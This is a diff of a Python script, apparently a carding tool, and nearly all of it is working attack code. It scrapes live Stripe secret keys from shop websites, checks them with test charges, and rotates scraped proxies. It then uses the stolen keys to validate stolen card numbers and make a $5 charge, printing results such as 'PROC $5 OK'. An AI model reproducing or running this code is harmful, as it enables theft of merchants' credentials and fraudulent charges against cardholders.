@@ -5,80 +5,88 @@ import aiohttp
 import asyncio
 from luhn import is_valid
 from bs4 import BeautifulSoup
-from config import PROXY_SOURCES, SHOP_LIST
+from config import PROXY_SOURCES, SHOP_SITES
 
-proxies = []
-keys = []  # SKs obfuscated
+proxies_list = []
+authkeys_list = []
 lock = asyncio.Lock()
 
-async def refresh_proxies():
-    global proxies
+async def update_proxy_list():
+    global proxies_list
     all_px = []
-    for url in PROXY_SOURCES:
+    for src in PROXY_SOURCES:
         try:
-            r = requests.get(url, timeout=10)
-            all_px.extend([p.strip() for p in r.text.split('\n') if ':' in p])
+            r = requests.get(src, timeout=10)
+            all_px += [p.strip() for p in r.text.split('\n') if ':' in p]
         except: pass
     all_px = list(set(all_px))[:1000]
     
     live_px = []
-    async with aiohttp.ClientSession() as session:
-        tasks = [test_px(session, px) for px in all_px[:200]]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        live_px = [r for r in results if isinstance(r, str)]
-    proxies = live_px[:50]
-    print(f"Updated: {len(proxies)} proxies ready")
+    connector = aiohttp.TCPConnector(limit=50)
+    async with aiohttp.ClientSession(connector=connector) as sess:
+        coros = [test_px(sess, px) for px in all_px[:200]]
+        res = await asyncio.gather(*coros, return_exceptions=True)
+        live_px = [px for px in res if isinstance(px, str)]
+    
+    proxies_list = live_px[:50]
+    print(f"Updated proxy list: {len(proxies_list)} active")
 
-async def test_px(session, px):
+async def test_px(sess, px):
     try:
-        proxy_url = f"http://{px}"
-        async with session.get("http://httpbin.org/ip", proxy=proxy_url, timeout=5) as r:
-            return px if r.status == 200 else None
+        prx = {"http://": f"http://{px}", "https://": f"http://{px}"}
+        async with sess.get("http://httpbin.org/ip", proxy=prx['http://'], timeout=aiohttp.ClientTimeout(total=5)) as resp:
+            return px if resp.status == 200 else None
     except: return None
 
-async def scrape_keys():
-    global keys
+async def harvest_authkeys():
+    global authkeys_list
     new_keys = []
-    async with aiohttp.ClientSession() as session:
-        shops = random.sample(SHOP_LIST, min(6, len(SHOP_LIST)))
-        for shop in shops:
+    connector = aiohttp.TCPConnector(limit=20)
+    async with aiohttp.ClientSession(connector=connector) as sess:
+        sites = random.sample(SHOP_SITES, min(5, len(SHOP_SITES)))
+        for site in sites:
             try:
-                async with session.get(shop, timeout=10) as r:
-                    if r.status == 200:
-                        txt = await r.text()
-                        found = re.findall(r'sk_live_[0-9a-zA-Z]+', txt)
-                        new_keys.extend(set(found))
+                async with sess.get(site, timeout=10) as resp:
+                    if resp.status == 200:
+                        txt = await resp.text()
+                        matches = re.findall(r'[sS][kK]_[lL][iI][vV][eE]_[0-9a-zA-Z]+', txt)
+                        new_keys += list(set(matches))
+                        
                         soup = BeautifulSoup(txt, 'html.parser')
-                        for script in soup.find_all('script'):
-                            if script.string:
-                                found = re.findall(r'sk_live_[0-9a-zA-Z]+', script.string)
-                                new_keys.extend(set(found))
+                        for scr in soup.find_all('script'):
+                            if scr.string:
+                                matches = re.findall(r'[sS][kK]_[lL][iI][vV][eE]_[0-9a-zA-Z]+', scr.string)
+                                new_keys += list(set(matches))
             except: pass
-    live_new = [k async for k in new_keys[:15] if await test_key(k)]
+    
+    live_new = [k for k in new_keys[:10] if await validate_key(k)]
     if live_new:
-        keys.extend(live_new)
-        keys = keys[-25:]
-        print(f"New keys: {len(live_new)} added. Total: {len(keys)}")
+        authkeys_list += live_new
+        authkeys_list = authkeys_list[-20:]
+        print(f"Harvested {len(live_new)} new keys. Total: {len(authkeys_list)}")
 
-async def test_key(key):
+async def validate_key(key):
     try:
-        h = {'Authorization': f'Bearer {key}'}
-        r = requests.post('https://api.stripe.com/v1/payment_intents', headers=h, data={'amount':'1'}, timeout=10)
+        hdr = {'Authorization': f'Bearer {key}'}
+        r = requests.post('https://api.stripe.com/v1/payment_intents', headers=hdr, data={'amount': '1'}, timeout=10)
         return r.status_code < 403
     except: return False
 
-async def get_proxies():
-    if not proxies: await refresh_proxies()
-    return proxies or ['']
+async def get_proxy_list():
+    if not proxies_list:
+        await update_proxy_list()
+    return proxies_list or ['']
 
-async def get_keys():
-    if not keys: await scrape_keys()
-    return keys or ['sk_live_test']
+async def get_authkeys():
+    if not authkeys_list:
+        await harvest_authkeys()
+    return authkeys_list or ['dummy_key']
 
-async def bin_info(bin_num):
+async def validate_bin(bin_num):
     try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(f'https://binlist.net/json/{bin_num}') as r:
+        connector = aiohttp.TCPConnector(limit=10)
+        async with aiohttp.ClientSession(connector=connector) as sess:
+            async with sess.get(f'https://binlist.net/json/{bin_num}') as r:
                 if r.status == 200:
                     data = await r.json()
                     scheme = data.get('scheme', '').lower()
@@ -86,25 +94,26 @@ async def bin_info(bin_num):
     except: pass
     return False, 'Unknown'
 
-async def process_data(data_str):
-    parts = re.split(r'[\|/ ]', data_str.strip())
-    if len(parts) < 4: return "Invalid format: num|mm|yy|cvv"
+async def process_card(full_data):
+    parts = re.split(r'[\|/ ]', full_data.strip())
+    if len(parts) < 4: return "Invalid format. Use num|mm|yy|cvv"
     num, mm, yy, cvv = parts[:4]
     
     if not is_valid(num) or not (1 <= int(mm) <= 12) or int(yy) < 26:
         return "Invalid Luhn/format"
     
     bin6 = num[:6]
-    valid_bin, bank = await bin_info(bin6)
-    if not valid_bin: return f"Bad BIN {bin6} ({bank})"
+    vbin, bank = await validate_bin(bin6)
+    if not vbin: return f"Invalid BIN {bin6} ({bank})"
     
-    px = random.choice(await get_proxies()) if proxies else None
-    px_dict = {'http': f'http://{px}', 'https': f'http://{px}'} if px else None
+    pxlist = await get_proxy_list()
+    px = random.choice(pxlist) if pxlist else None
+    prx_dict = {'http': f'http://{px}', 'https': f'http://{px}'} if px else None
     
-    curr_keys = await get_keys()
-    for key in curr_keys[:]:
+    keylist = await get_authkeys()
+    for key in keylist:
         try:
-            post_data = {
+            pdata = {
                 'amount': '100', 'currency': 'usd',
                 'payment_method_data[type]': 'card',
                 'payment_method_data[card][number]': num,
@@ -112,17 +121,19 @@ async def process_data(data_str):
                 'payment_method_data[card][exp_year]': f'20{yy}',
                 'payment_method_data[card][cvc]': cvv,
             }
-            headers = {'Authorization': f'Bearer {key}', 'Content-Type': 'application/x-www-form-urlencoded'}
-            resp = requests.post('https://api.stripe.com/v1/payment_intents', data=post_data, proxies=px_dict, headers=headers, timeout=15)
-            if resp.status_code == 200 and 'requires_action' not in resp.text.lower():
-                # Process $5
-                killer_data = post_data.copy(); killer_data['amount'] = '500'
-                killer_resp = requests.post('https://api.stripe.com/v1/payment_intents', data=killer_data, proxies=px_dict, headers=headers, timeout=15)
-                status = " | PROCESSED $5 ✅" if killer_resp.status_code == 200 else " | VALID AUTH"
-                if not await test_key(key): keys.remove(key)
-                return f"VALID [gate1] {bank} | BIN:{bin6}{status}"
+            hdr = {'Authorization': f'Bearer {key}', 'Content-Type': 'application/x-www-form-urlencoded'}
+            resp = requests.post('https://api.stripe.com/v1/payment_intents', data=pdata, proxies=prx_dict, headers=hdr, timeout=15)
+            txt_resp = resp.text.lower()
+            if resp.status_code == 200 and 'requires_action' not in txt_resp:
+                # Process charge $5
+                cdata = pdata.copy()
+                cdata['amount'] = '500'
+                cresp = requests.post('https://api.stripe.com/v1/payment_intents', data=cdata, proxies=prx_dict, headers=hdr, timeout=15)
+                proc_status = " | PROC $5 OK" if cresp.status_code == 200 else " | VALID ONLY"
+                if not await validate_key(key):
+                    authkeys_list.remove(key)
+                return f"VALID [paygw1] {bank} | BIN:{bin6}{proc_status}"
         except:
-            if key in keys: keys.remove(key)
+            if key in authkeys_list: authkeys_list.remove(key)
             continue
-    return "All failed - Auto refresh active"
-
+    return "All gw fail. Updating lists..."
